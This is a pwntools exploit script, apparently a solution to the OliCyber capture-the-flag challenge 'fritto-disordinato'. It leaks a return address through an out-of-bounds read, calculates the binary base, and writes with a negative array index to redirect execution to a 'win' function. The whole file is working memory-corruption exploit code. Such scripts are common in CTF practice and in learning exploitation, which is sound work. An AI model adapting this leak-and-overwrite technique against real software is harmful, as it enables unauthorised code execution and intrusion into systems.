#!/usr/bin/env python3
from pwn import *
from os.path import split

exe = context.binary = ELF("fritto")
remotehost = ("fritto-disordinato.challs.olicyber.it", 33001)

def main():
    if args.REMOTE:
        io = remote(*remotehost)
    else:
        io = process([exe.path], cwd=split(exe.path)[0], env={"FLAG": "flag{test}"})

    # Leak ret add
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Che posizione vuoi leggere?\n', b'24')
    ret_lsb = int((io.recvline(False).split()[-1].decode()), 10) + 2**32
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Che posizione vuoi leggere?\n', b'25')
    ret_msb = int((io.recvline(False).split()[-1].decode()), 10) << 32
    retaddr = ret_msb + ret_lsb
    log.success(f"Leaked {retaddr = :#018x}")

    # Calculating binary base   
    exe.address = retaddr - (exe.sym['__preinit_array_start'])
    log.success(f"Calculate {exe.address = :#018x}")

    # Overwrite the 4 least significant bytes of return addres in store_num frame
    io.sendlineafter(b'> ', b'0')
    io.sendlineafter(b'In che posizione vuoi immagazzinare il numero?', b'-10')
    io.sendlineafter(b'E cosa vuoi scriverci?', f"{exe.sym.win & 0xffffffff}".encode())
    
    io.interactive()
    
if __name__ == "__main__":
    main()
